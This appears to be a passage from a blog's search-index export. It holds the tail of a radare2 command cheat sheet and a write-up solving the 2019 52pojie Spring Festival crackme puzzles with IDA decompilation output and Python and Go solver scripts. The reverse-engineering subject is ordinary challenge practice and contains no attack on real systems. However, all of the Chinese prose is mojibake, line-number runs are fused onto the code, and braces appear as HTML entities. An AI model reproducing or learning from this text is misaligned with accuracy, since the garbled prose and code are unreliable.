[q]â€”â€”è·å–å…¥å£ç‚¹åœ°å€ iSâ€”â€”æŸ¥çœ‹åŒºæ®µçš„å„ä¸ªæƒé™ï¼ˆè¯»/å†™/æ‰§è¡Œï¼‰ i~canaryâ€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯Canary i~picâ€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯PIE i~nxâ€”â€”æ£€æŸ¥æ˜¯å¦å¼€å¯NX å†…å­˜ dmâ€”â€”æŸ¥çœ‹å†…å­˜ä¿¡æ¯ dmmâ€”â€”åˆ—å‡ºæ¨¡å—ï¼ˆå†…å­˜ä¸­çš„è¿è¡Œåº“å’ŒäºŒè¿›åˆ¶æ¨¡å—ï¼‰ dmi [addr|libname] [symname]â€”â€”åˆ—å‡ºç›®æ ‡åº“çš„æ ‡å¿— æŸ¥æ‰¾ e search.*â€”â€”ç¼–è¾‘æŸ¥æ‰¾é…ç½® /?â€”â€”åˆ—å‡ºæŸ¥æ‰¾çš„å­å‘½ä»¤ / stringâ€”â€”åœ¨å†…å­˜æˆ–ç¨‹åºæ®µæŸ¥æ‰¾å­—ç¬¦ä¸² /R [?]â€”â€”æŸ¥æ‰¾ç‰¹å®šçš„ROP /R/â€”â€”ROPå¸¸è§„æœç´¢ è°ƒè¯• dcâ€”â€”ç»§ç»­æ‰§è¡Œ dcu addrâ€”â€”ç»§ç»­æ‰§è¡Œåˆ°æŸä¸ªåœ°å€ dcrâ€”â€”ç»§ç»­æ‰§è¡Œç›´åˆ°retï¼ˆå•æ­¥æ­¥è¿‡ï¼‰ dbt [?]â€”â€”åœ¨dbg.btdepthå’Œdbg.btalgoçš„åŸºç¡€ä¸Šå›æº¯æŒ‡ä»¤ doo [args]â€”â€”é‡æ–°æ‰“å¼€è°ƒè¯•å¹¶è®¾ç½®å‚æ•° dsâ€”â€”å•æ­¥æ­¥å…¥ dsoâ€”â€”å•æ­¥æ­¥è¿‡ å›¾å½¢æ¨¡å¼ pdf @ addrâ€”â€”è¾“å‡ºå½“å‰ä½ç§»ä¸‹å‡½æ•°çš„æ±‡ç¼–ä»£ç  Vâ€”â€”å¯è§†åŒ–æ¨¡å¼ï¼Œä½¿ç”¨p/På†ä¸¤ä¸ªæ¨¡å¼é—´åˆ‡æ¢ VVâ€”â€”å›¾å½¢æ¨¡å¼ï¼Œåœ¨asciiå›¾åƒä¸‹åˆ†æ V!â€”â€”æ§åˆ¶æ¿æ¨¡å¼ï¼Œå¯¹æ¼æ´åˆ©ç”¨éå¸¸æœ‰ç”¨ çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä¹Ÿè®¸æœ‰æ›´å¤šçš„å†…å®¹èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚","categories":[],"tags":[{"name":"translation","slug":"translation","permalink":"https://qianfei11.github.io/tags/translation/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨-writeup","slug":"2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨-writeup","date":"2019-02-21T12:33:03.000Z","updated":"2019-02-27T02:25:41.122Z","comments":true,"path":"2019/02/21/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/02/21/2019-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨-writeup/","excerpt":"åšäº†ç‚¹ç®€å•çš„é¢˜ç›®ã€‚","text":"åšäº†ç‚¹ç®€å•çš„é¢˜ç›®ã€‚ ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸€æ‰«ç å…³æ³¨å³å¯ã€‚ ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹äºŒæŸ¥å£³æ˜¯upxï¼ŒESPå®šå¾‹æ³•æ‰¾åˆ°OEPè„±å£³ã€‚ç„¶åæ”¾è¿›idaé‡Œï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647HWND main_func()&#123; HWND result; // eax char *input; // esi char *key; // edi int enc_1; // [esp+0h] [ebp-14h] int enc_2; // [esp+4h] [ebp-10h] int enc_3; // [esp+8h] [ebp-Ch] int enc_4; // [esp+Ch] [ebp-8h] char v7; // [esp+10h] [ebp-4h] result = GetDlgItem(0, 1000); if ( result ) &#123; if ( GetWindowTextLengthA(result) == 16 ) &#123; input = (char *)malloc(0x11u); key = (char *)malloc(0x11u); *(_DWORD *)input = 0; *((_DWORD *)input + 1) = 0; *((_DWORD *)input + 2) = 0; *((_DWORD *)input + 3) = 0; input[16] = 0; *(_DWORD *)key = 0; *((_DWORD *)key + 1) = 0; *((_DWORD *)key + 2) = 0; *((_DWORD *)key + 3) = 0; key[16] = 0; GetDlgItemTextA(0, 1000, input, 17); enc_3 = 'udhY'; enc_1 = 'ssdH'; enc_2 = 'zhNb'; enc_4 = '9102'; v7 = 0; encrypt((const char *)&amp;enc_1, (int)key, 3); if ( !strcmp(key, input) ) result = (HWND)MessageBoxA(0, aOye, Caption, 0); else result = (HWND)MessageBoxA(0, aAuey, Caption, 0); &#125; else &#123; result = (HWND)MessageBoxA(0, &amp;Text, Caption, 0); &#125; &#125; return result;&#125; çœ‹ä¸‹æ¥åº”è¯¥å°±æ˜¯æŠŠ16ä½çš„encåŠ å¯†äº†ä¸€ä¸‹ï¼Œç„¶åå’Œinputæ¯”è¾ƒã€‚çœ‹çœ‹encrypt()å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142signed int __cdecl encrypt(const char *enc, int key, int num_3)&#123; const char *enc_0; // edx unsigned int length; // kr04_4 int v5; // esi int i; // edi char c; // al char alphabet[29]; // [esp+Bh] [ebp-1Dh] char tmp; // [esp+30h] [ebp+8h] strcpy(&amp;alphabet[1], \"abcdefghijklmnopqrstuvwxyz\"); if ( !key ) return -1; enc_0 = enc; if ( !enc ) return -1; if ( num_3 &lt;= 0 ) return -1; length = strlen(enc) + 1; if ( (signed int)(length - 1) &lt;= 0 ) return -1; v5 = key - (_DWORD)enc; tmp = alphabet[num_3 + 1]; i = length - 1; do &#123; c = *enc_0; if ( *enc_0 &lt; tmp || c &gt; 122 ) &#123; if ( c &gt;= 97 &amp;&amp; c &lt;= alphabet[num_3] ) c = c - num_3 + 26; &#125; else &#123; c -= num_3; &#125; (enc_0++)[v5] = c; --i; &#125; while ( i ); return 0;&#125; å°±æ˜¯å¯¹å­—ç¬¦ä¸²åˆ¤æ–­æ˜¯å¦ä¸ºå­—æ¯ï¼Œç„¶åæ ¹æ®å­—æ¯è¡¨alphabetåšæ˜ å°„å’ŒåŠ å‡ã€‚æ­£å‘å®ç°ä¸€ä¸‹è„šæœ¬å°±å¾—åˆ°å£ä»¤äº†ï¼š 1234567891011121314151617181920212223#!/usr/bin/env pythonenc = ('9102' + 'udhY' + 'zhNb' + 'ssdH')[::-1]print encalpha = 'abcdefghijklmnopqrstuvwxyz'num = 3t = alpha[num + 1]i = len(enc)j = 0res = ''while i != 0: c = enc[j] if ord(c) &lt; ord(t) or ord(c) &gt; 122: if ord(c) &gt;= 97 and ord(c) &lt;= ord(alpha[num]): c = chr(ord(c) - num + 26) if ord(c) &gt; ord(alpha[-1]): c = chr(ord(c) - 26) else: c = chr(ord(c) - num) res += c j += 1 i -= 1print res# HappyNewYear2019 ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ä¸‰è¿™é“é¢˜æˆ‘æŸ¥äº†å£³ç„¶åä¸ä¼šè„±å°±ä¸€ç›´æ²¡åšã€‚çœ‹äº†writeupå±…ç„¶æ˜¯ç›´æ¥è¿›idaå°±åˆ†æäº†ã€‚æœç´¢åˆ°mainå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156int main_main()&#123; int v0; // ST04_4 _DWORD *v1; // ST04_4 _DWORD *v2; // ST04_4 int v3; // ST04_4 _DWORD *v4; // ST04_4 int v5; // ST10_4 int v6; // ST14_4 int v7; // ST18_4 int v8; // ST04_4 int result; // eax char v10; // ST0C_1 int v11; // [esp+0h] [ebp-7Ch] int v12; // [esp+4h] [ebp-78h] int v13; // [esp+4h] [ebp-78h] int v14; // [esp+8h] [ebp-74h] int v15; // [esp+Ch] [ebp-70h] int v16; // [esp+Ch] [ebp-70h] int v17; // [esp+Ch] [ebp-70h] char v18; // [esp+Ch] [ebp-70h] int v19; // [esp+10h] [ebp-6Ch] int v20; // [esp+10h] [ebp-6Ch] int v21; // [esp+10h] [ebp-6Ch] int v22; // [esp+14h] [ebp-68h] int v23; // [esp+14h] [ebp-68h] int v24; // [esp+14h] [ebp-68h] int v25; // [esp+14h] [ebp-68h] unsigned int v26; // [esp+18h] [ebp-64h] int v27; // [esp+18h] [ebp-64h] int v28; // [esp+1Ch] [ebp-60h] int v29; // [esp+1Ch] [ebp-60h] int v30; // [esp+20h] [ebp-5Ch] int v31; // [esp+24h] [ebp-58h] int v32; // [esp+28h] [ebp-54h] int v33; // [esp+2Ch] [ebp-50h] int v34; // [esp+2Ch] [ebp-50h] _DWORD *v35; // [esp+30h] [ebp-4Ch] _DWORD *v36; // [esp+34h] [ebp-48h] _DWORD *v37; // [esp+38h] [ebp-44h] int *v38; // [esp+3Ch] [ebp-40h] int v39; // [esp+40h] [ebp-3Ch] int *v40; // [esp+44h] [ebp-38h] void *v41; // [esp+48h] [ebp-34h] int *v42; // [esp+4Ch] [ebp-30h] void *v43; // [esp+50h] [ebp-2Ch] int *v44; // [esp+54h] [ebp-28h] _DWORD *v45; // [esp+58h] [ebp-24h] int *v46; // [esp+5Ch] [ebp-20h] void *v47; // [esp+60h] [ebp-1Ch] int *v48; // [esp+64h] [ebp-18h] _DWORD *v49; // [esp+68h] [ebp-14h] int *v50; // [esp+6Ch] [ebp-10h] void *v51; // [esp+70h] [ebp-Ch] int *v52; // [esp+74h] [ebp-8h] void *v53; // [esp+78h] [ebp-4h] void *retaddr; // [esp+7Ch] [ebp+0h] if ( (unsigned int)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(0x14u) + 8) ) runtime_morestack_noctxt(); v52 = dword_4A04E0; v53 = &amp;main_statictmp_0; fmt_Println(&amp;v52, 1, 1); runtime_newobject(dword_4A04E0, v0); v36 = v1; runtime_newobject(dword_4A04E0, v1); v37 = v2; v50 = dword_4A04E0; v51 = &amp;main_statictmp_1; fmt_Print(&amp;v50, 1, 1); v48 = dword_498EE0; v49 = v36; fmt_Scanln(&amp;v48, 1, 1); v46 = dword_4A04E0; v47 = &amp;main_statictmp_2; fmt_Print(&amp;v46, 1, 1); v44 = dword_498EE0; v45 = v37; fmt_Scanln(&amp;v44, 1, 1); runtime_newobject(dword_4A90C0, v3); v35 = v4; *v4 = 1732584193; v4[1] = -271733879; v4[2] = -1732584194; v4[3] = 271733878; v4[4] = -1009589776; v4[21] = 0; v4[22] = 0; v4[23] = 0; runtime_stringtoslicebyte(0, *v36, v36[1]); crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22); crypto_sha1___digest__Sum(v35, 0, 0, 0, v5, v6); if ( v26 &lt; 0x10 ) runtime_panicslice( v11, v12, v14, v16, v20, v23, v26, v28, v30, v31, v32, v33, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52, v53); v34 = v20; encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[1], v16, v20, v23, v26); if ( v7 ) &#123; v42 = dword_4A04E0; v43 = &amp;main_statictmp_3; result = fmt_Println(&amp;v42, 1, 1); &#125; else &#123; main_AesDecrypt(v17, v21, v24, v34, 16, 16, 0, v28); if ( v31 ) &#123; v40 = dword_4A04E0; v41 = &amp;main_statictmp_4; result = fmt_Println(&amp;v40, 1, 1); &#125; else &#123; if ( v29 == 26 &amp;&amp; (runtime_memequal(v27, dword_4B8A80, 26, v18), v10) ) fmt_Printf(dword_4BCC04, 73, 0, 0, 0, v25, v27, 26); else fmt_Printf(&amp;word_4B84CE, 24, 0, 0, 0, v25, v27, v29); runtime_newobject(dword_4A04E0, v13); v38 = dword_498EE0; v39 = v8; result = fmt_Scanln(&amp;v38, 1, 1); &#125; &#125; return result;&#125; å¤§æ¦‚å¯ä»¥æ¨æµ‹ï¼Œå…ˆè¿›è¡Œbase64ï¼Œç„¶åaesè§£å¯†ï¼Œæœ€åå’Œæ•°æ®æ®µä¸­ä¸€ä¸²é•¿åº¦ä¸º26çš„å­—ç¬¦ä¸²æ¯”è¾ƒã€‚å…·ä½“å­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥dumpå‡ºæ¥ï¼š 123456data = [0x48, 0x61, 0x70, 0x70, 0x79, 0x4E, 0x65, 0x77, 0x59, 0x65, 0x61, 0x72, 0x46, 0x72, 0x6F, 0x6D, 0x35, 0x32, 0x50, 0x6F, 0x4A, 0x69, 0x65, 0x2E, 0x43, 0x6E, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x49, 0x73, 0x6C, 0x61, 0x6E, 0x64, 0x73, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x4E, 0x65, 0x77, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x6C, 0x61, 0x6E, 0x64, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69]output = ''for i in range(26): output += chr(data[i])print output# HappyNewYearFrom52PoJie.Cn è°ƒè¯•ä¸­å¯ä»¥ä»å†…å­˜é‡Œdumpåˆ°EF2D8BFA0C30AB270B92CC73A563AFA3å…¶å®è¿™ä¸€ä¸²æ•°æ®å°±æ˜¯uidå¯¹åº”çš„sha1æ•£åˆ—å€¼ef2d8bfa0c30ab270b92cc73a563afa3b04faa75çš„å­—èŠ‚æ•°ç»„å½¢å¼ï¼Œå–å‰16ä½AESåŠ å¯†æ–¹å¼ä¸ºCBCï¼ˆmain_AesDecryptå‡½æ•°ä¸­å¯ä»¥ç›´æ¥çœ‹å‡ºï¼‰ï¼Œè¡¥ç æ–¹å¼ä¸ºPKCS5Paddingï¼ˆAESè§£å¯†é”™è¯¯æ—¶ï¼Œä¼šé€€å‡ºç¨‹åºï¼Œä½†æ˜¯æœ‰å¼‚å¸¸ä¿¡æ¯ä¸€é—ªè€Œè¿‡ï¼Œç»™æŠ¥é”™å‡½æ•°ä¸‹æ–­ç‚¹å³å¯æŸ¥çœ‹å¼‚å¸¸ä¿¡æ¯ï¼‰æ‰€ä»¥æŠŠEF2D8BFA0C30AB270B92CC73A563AFA3è½¬åŒ–æˆå­—èŠ‚æ•°ç»„ï¼Œä½¿ç”¨AES/CBC/PKCS5Paddingæ–¹å¼åŠ å¯†HappyNewYearFrom52PoJie.Cnï¼Œå†è¿›è¡Œbase64åŠ å¯†å°±å¯å¾—åˆ°å£ä»¤ã€‚ goè¯­è¨€å®ç°ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( \"fmt\" \"bytes\" \"crypto/cipher\" \"crypto/sha1\" \"crypto/aes\" \"encoding/base64\")func PKCS5Padding(ciphertext []byte, blockSize int) []byte &#123; padding := blockSize - len(ciphertext)%blockSize padtext := bytes.Repeat([]byte&#123;byte(padding)&#125;, padding) return append(ciphertext, padtext...)&#125;func PKCS5UnPadding(origData []byte) []byte &#123; length := len(origData) unpadding := int(origData[length-1]) return origData[:(length - unpadding)]&#125;func AesEncrypt(origData, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() origData = PKCS5Padding(origData, blockSize) blockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) crypted := make([]byte, len(origData)) blockMode.CryptBlocks(crypted, origData) return crypted, nil&#125;func AesDecrypt(crypted, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) origData := make([]byte, len(crypted)) blockMode.CryptBlocks(origData, crypted) origData = PKCS5UnPadding(origData) return origData, nil&#125;func main() &#123; uid := \"351649\" h := sha1.New() h.Write([]byte(uid)) bs := h.Sum(nil) var aeskey = bs[0:16] pass := []byte(\"HappyNewYearFrom52PoJie.Cn\") xpass, err := AesEncrypt(pass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; pass64 := base64.StdEncoding.EncodeToString(xpass) fmt.Printf(\"åŠ å¯†å:%v\\n\",pass64) bytesPass, err := base64.StdEncoding.DecodeString(pass64) if err != nil &#123; fmt.Println(err) return &#125; tpass, err := AesDecrypt(bytesPass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(\"è§£å¯†å:%s\\n\", tpass)&#125; ã€æ˜¥èŠ‚ã€‘è§£é¢˜é¢†çº¢åŒ…ä¹‹ç•ªå¤–ç¯‡ç•ªå¤–ç¯‡ä¸ªäººæ„Ÿè§‰åº”è¯¥ç®—æ˜¯ä¸€é“ctfé‡Œçš„miscé¢˜äº†ã€‚å‹ç¼©åŒ…é‡Œç»™äº†ä¸€ä¸ªå¤§éƒ¨åˆ†æ–‡å­—è¢«åŠ å¯†çš„mdæ–‡ä»¶ï¼š 12345678910111213# ÈÄ†Å…ÆƒÈ“Æ‡Å„ÆƒÈ’Ä‹ÆÃÉŒÃ‡Å„ÃŸÉŒÄ‰Å‡Æ…Å•Æ‡ÅƒbÈ’È¼ÈµÃŸÈ’Ä†ÈµÆÈ“Ä‰nÆÉŒÄ‡Ç¸ÃŸÆ¦Ä‡ÆÆÈ“Ä‰nÆ…È“ÄÆÃÉŒÄ‡Ã‘bÈ’ÄŒÅƒbÈ’Ä‹Ã‘bÅ•Æ‡ÅƒÃ¾È’ÄŒNÆƒÈ’ÄˆÃ‘Æ„È“ÄŠÃ‘Æ„Å•Æ‡Å†ÃÈ“ÄÆÃÉŒÄ‡Ã‘bÈ’Ä‹ÆÃÅ˜cÇ¸ÃÈÄ†Å…BÆ¦ÄŠÈµÃ¾Å™Ã‡ÈµÆ…ÈÄ‹Å‡bÉŒcÅ„Ã¾È“ÄŒÅ‡ÆÅ•Æ‡NÆ€È’ÄŒÅƒBÉŒÄ‡Ã‘BÉŒÄ‹nÆ„È“ÄˆÆbÅ—Æ‡ÆÃÅ—ÄnBÅ•Æ‡nÃ¾È’È»ÅƒBÈ“Ä‰nÆ…È’ÄŒNÆ…È’ÆˆÅ‡Ã¾Å•ÄÈ ÃŸÅ•Æ‡ÅƒÆƒÅ™ÄÈ bÅ™Ä‹ÈµÆ€ÈÄNÆ„Å•Æ‡Å†ÆƒÉŒcÅ…Æ„ÉŒÄ‹nÃ¾Å•Æ‡Å‡ÆÈ“Æ‡Å„ÆÅ•Æ‡Å„Ã¾ÉŒcÅ„Æ„Å•Æ‡Å„Ã¾ÉŒCÅˆÆ€Æ¦È»ÆÆƒÅ•Æ‡Å„Ã¾ÉŒCÅˆÆ€ÈÄ‰Å†Ã¾Å—cÅ…Æ…È’ÄˆÃ‘Æ„È“ÄŠÇ¸Æ…È“ÄˆÈµÃ¾ÉŒÄ‡ÆÃŸÅ•Æ‡Å†ÃÈ’È»ÅƒÃ¾ÉŒCÅˆÆ€ÉŒÄ‡Ç¸bÈ’È¼Ç¹ÃŸÈ“ÄˆÆB[Æ¦Ä‰Å†ÆƒÅ–Ä‹Å…Ã¾Å•Æ‡Å…Æ€È’CÅ…Æ€È’ÆˆÅ‡Ã¾ÉŒcÅ…Æ„ÉŒÄ‰Å‡ÃŸÅ•Æ‡Å†ÃÈ“ÄÆÃÈ’ÆˆÅˆÃ¾Å•Æ‡Å„Ã¾È“Ä‰nÃ¾È“ÄŒÅ‡BÅ—cÅ…Æ…ÉŒÄ‡ÆÆÈ“Ä‡Å…ÆÅ•Æ‡Å†ÃÈ’È»ÅƒÃ¾ÉŒCÅˆÆ](//rcnb.xyz)Å™ÄŠÃ‘bÈ’Ä‰È Æ€ÉŒÄ‡Ã‘bÈ’Ä‹ÆÃÈ“Ä‡Å…ÆÉŒÆˆÈ ÆƒÅ•Æ‡ÅƒÃ¾È’È»ÅƒÃ¾È’ÄˆÆÃÈ‘Ã‡Ç¹Æ„ÉŒCÈ Æ„Æ¦È»Å‡Æ…ÉŒÄ‡ÆBÈÄnÃÅ—Ã‡Ã‘BÅ™ÄŠÃ‘bÉŒÄ†nÃ¾Å—Ã‡Ç¹bÈÈ¼ÅƒÃŸÉŒÄ‡Ã‘bÅ•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡Å†ÃÉŒcÅ„Ã¾È’CÅ…bÅ•È»Å˜ÄˆÃ‘Æ€ÆÆ„Å˜È»Å–ÄŠÇ¸Æ€rcnÆƒÅˆÃŸÉÄ‰ÆÆ€RÄŒÅ†bRÃ‡rcnbrcnbrcnbÅ–ÄŠÆÆƒrcnbrcnbrcnbrÄŒNÃ¾È“Ä‰ÆÆnÆ…Å”Æ‡Å„ÃrÄ‡Ç¹ÆÈ“Ä†Ã‘Æ…Å”È¼Å•Ã‡ÆÆ…ÆÃŸÈCÅ…ÆÈÆ‡Å–Ä†ÅˆÆÉŒÆ‡ÈµÆƒÈ‘ÄˆÈ ÆƒNÆƒÆ¦ÄÆÆ„È“Ä‰Å•ÄŒÅˆÆƒÅ‡bÈÄ†È‘Ä‡nÆ…Å˜È¼ÈµÃŸÆÃŸRÄ†Ç¸Æ„ÉŒCÆBÈ‘ÄŠÅ…ÃÅ—ÄŠÉŒÈ¼ÅƒÃŸÅ‡ÆÅ”cÅ”ÆˆÇ¹ÃÈ ÆÉŒÄ†Å„Æ…ÉÄ‰ÆÃÅ–Ã‡ÉŒcÅ‡Æ…Å–Ä†nÃ¾Å„ÆÈ“ÄŒÅˆÆ„Å˜È»È“È»nÆƒÇ¸ÆÉŒCÈ’Ä‡ÈµÆÈµÆ„ÉŒCÅ…Æ…ÈÄÅƒÆ€Å™CÅ™Æ‡Å‡ÆÇ¸Ã¾Å™Ã‡ÆbÆ¦ÄŒnbRCÆÃŸÈÄ‡Ç¹ÆÅ”È»Å™È»Å†BÇ¹BÈ‘Ä‹Å—Ã‡ÆÆƒÈ BÉŒÄ†Ã‘ÆƒÅ•ÄÅ†ÆƒÈ“Æ‡Å„bÅ–ÄÃ‘bÉŒÄŠÅ—ÆˆÃ‘BRcÆÆÈ‘Æ‡Å„ÃÆ¦ÄŒÇ¹Æ€Ç¸Æ€Å˜cÅ˜È»nÆ…RCÅ†ÆƒÅ…Æ„ÈÄ‰NÃÅ˜ÄˆÃ‘Æ„Å•ÄÈÄ‡Ç¹bÅ‡ÃÈ“Ä‡Ç¹ÃŸÉŒÄˆÅ”È»ÅˆÆ€ÆbÈÃ‡rCÇ¹ÃÈ“È»ÅƒBÅ„Æ„ÉÄ‹Å„bÉŒÄŒÅ—Æ‡nÆ…ÈµÆ€Å—Ä‹Å†ÃŸRCÅ‡bÅ™ÄŒÅ™Ä‡Ã‘Æ€ÈÄŠÅƒbÇ¸Æ…ÉcÈ‘CÈµbÇ¸ÃŸÈ‘Æ‡È‘CÇ¹Æ…Å˜È»ÅƒÆƒÅ™Ä‹ÅƒÃ¾nÆ„RÄ‹Ç¹BrÆ‡Å„ÆƒÅ–ÄˆÈ‘Ä‰Å†bÆÆ…Æ¦Ä†rCÆÃÆ¦Ä†Ã‘BÅ†Æ„rÄ‡È‘Æ‡Ã‘Æ…Å„Æ„Æ¦Æ‡Å—Ä†nÆ€Å”Ä†È Æ„ÈÄ‡NÆ€Ã‘Æ…Æ¦È¼È“Ä‰Å‡Æ„ÈµÃŸÈ‘CÇ¹Æ„ÈÈ¼Å—Ä‡È ÆƒÅ…BÈ“CÈ ÆÅ”Ä‹ÆÃŸÅ™cÅ˜ÄÅ…bÆ¦ÄŠÆÆƒÉŒÄ‹ÆÆ€nÆÅ˜È»Ã‘bÅ–ÄÅ—CnÃ¾È’È»Ã‘Æ…NÃ¾Å™È¼rÆˆNÆÅ•Ä†ÆBÈÃ‡ÅˆÆ…ÈCÅƒÃŸÅ…Æ„rÄ‡ÆÆ€È“ÄŠÅ„ÆƒÅ–Æ‡Ç¸ÆÅ™Ä‹Å˜Ä‡ÅƒÆÅ˜È¼Ã‘Æ…È‘Ä‹ÈµÆ€ÅƒÃ¾rÆ‡ÅƒÃŸÅ•Ä‰rÄ‡NÃ¾È’È»ÆÆÉŒÆˆÈ bÆ¦ÄŠNÆ…Å”CÆÃŸÈ“ÄŒÅ„ÃÆ¦Ä‹Å‡bÅ–ÆˆÅ†ÆƒÅ–Ä‰ÈµÃ¾nÆƒÉÄ‰ÉŒÆˆÅˆÃÅ™ÄÇ¹BÈ bÅ•Ä‰Å™Ä‹Å„Ã¾Å†Æ„È‘Ã‡ÆÆÈ’cÅ˜Ä‰Ç¸Æ…ÅˆÆƒÈ’cÅ”ÄˆÅ„ÃŸÇ¹ÆÆ¦Ä‡È“È¼Ç¹ÆÃ‘ÆÆ¦CÈ‘Ä‹Å‡Æ„È“ÆˆnÆ„ÈµÆ„rcÅ˜ÄnÆƒÈµÃŸRÄÈ‘cNÆrÄŠNÆ…ÈÃ‡Å‡ÆÅ†ÆÈ’ÄnÆ€ÉŒÄŒÅˆbÉŒÄ†rÈ¼ÆÃÅ‡ÆƒÉŒCÅ™Ã‡nÃ¾ÅˆÆ…È’È¼ÆBÈ‘cÈÈ»nBÅˆÆÈ‘Ä‹È“cÈ bÇ¹Ã¾È‘Æ‡Ç¹ÆrÄˆÅ–ÆˆÅˆÆÅ—cÈµbÅˆÃ¾Å™È¼Æ¦ÄˆÅƒÆ…ÅˆÃŸÅ—cÅƒÆ€Æ¦ÄŠÅ”cÅ„ÃÅ–Ä‰È Æ…ÅƒÆÈ‘ÄŠÈÃ‡È Ã¾ÆÃÉŒÆ‡ÈµÆ…ÈÈ¼ÉÄ‰Ã‘BrÆ‡Å‡Æ…Å”ÄÆÃŸnÆ…Å—ÄˆÉÄ†ÈµÆ…Å–ÄŒÅ†bÅ–Ä†È ÃÈ’Ä‹Ã‘ÆƒÅ—Ä‹NÆƒÅ•È»ÅƒÃNÃÅ”ÄÅ•Ä†ÆÆƒNÆƒRÄŒÈÄ†Å†ÆÅƒÆ€Å™Ä‹ÅƒbÈ“ÄÆÆƒÈ‘cÅ”Ä†NÃ¾È‘ÄÈ bÅ—Ä†NÃ¾Å‡ÆÈ“ÄrÄÅƒÆ„È‘Ä‰nÃ¾Å…Ã¾È“È»Å™cÃ‘Æ„Å–Æ‡Ã‘ÃŸÈÄ†Å„bÅ…bÅ•ÄŠÅƒÃŸÅ•ÄŒÅ‡ÃÈ’cÃ‘ÆÈ‘Ä†Å˜Ã‡Å„ÆƒRÆˆÇ¸Æ…Å•cÈ bÅ†ÃÈ‘Ä‹RÆˆÅ‡Æ€ÈcÅˆÃ¾Å„ÃÆ¦ÄˆÉCÈ Æ€Ã‘BRÄ‰Ç¸ÆÅ—È¼È‘Æ‡nÆÈµÃŸÅ•Æ‡Å–Ä‹ÆÆ…Å™Æ‡Ç¹Ã¾Å‡Æ„Å–Ã‡È ÆƒRÄˆÇ¸Æ…Å•Æ‡Å†Ã¾Å”ÄŠÅ™ÆˆÅˆbÆÃŸrÆˆÅ•Ã‡Ç¸Ã¾ÅƒÃÈÄ†nbÈ‘Ä‰È‘È»Ç¸ÆƒÇ¹Æ€RÆ‡rÆˆNbnÆ„rÄ‹rÄ‰Å…BÆ¦cÅˆÃ¾RÄ‹ÅˆÆnBÅ—È¼Ã‘ÆÅ•Ä‹ÆÃŸÉÄˆÅ—Ä‡Å†Æ€Ç¹ÆÈ‘ÄˆÅ…Ã¾Å”Æ‡ÅˆÆ…Å—Æ‡rÄŠÇ¹Æ„Ç¸ÃŸÈ’ÆˆÇ¹ÃŸÅ•È»È BÅ”Ä‡ÆÃ¾Å”È»Ã‘BÈ“Ä†Ç¸ÃÈ‘Ä‹Å•Ä‰ÅƒÃ¾ÅƒÆ€Å˜cÅ™È»Ã‘BÅ…Æ€ÉŒÆˆÅ„Æ„Å”ÄŠÃ‘ÃÆ¦ÄˆÆÆƒÈ“È¼Å†ÆÅ˜È»nÆ„Å”Ä‡Å–Ä‹Ç¸Æ„Å…BÅ–Ã‡È“Ä‰Å…BÅˆÆ„ÈÈ¼Å–Ã‡Å†bÇ¹Æ…rÈ»Ã‘ÃÅ”ÄŒÅ…ÃŸÅ”ÄŠNÃ¾ÉŒÆ‡È ÃRÄ‰nÃ¾Å™ÄÅ•Ä‹NÃ¾È Ã¾Æ¦È¼È Æ…RÄ†Ã‘Æ„Å—Ä‡Å˜ÄÅƒÆ„Å–Ã‡Ã‘Æ„Ç¹bÈ‘Ä†Å–Ã‡Ç¹Ã¾ÆÆ„È“cÆÆRCÇ¸Æ„ÉÄ‡È’ÄŒNÆ…È“È»ÅˆÃÅ†BRÄ†ÆbÅ™Æ‡Å–cÈ bÅ™È»Å„Æ„Å—Ä†ÅƒÃÅƒBÆ¦Ä‰Å—ÄŠNÃ¾Å™ÄŠÅ†ÃŸÈ’Ä†È 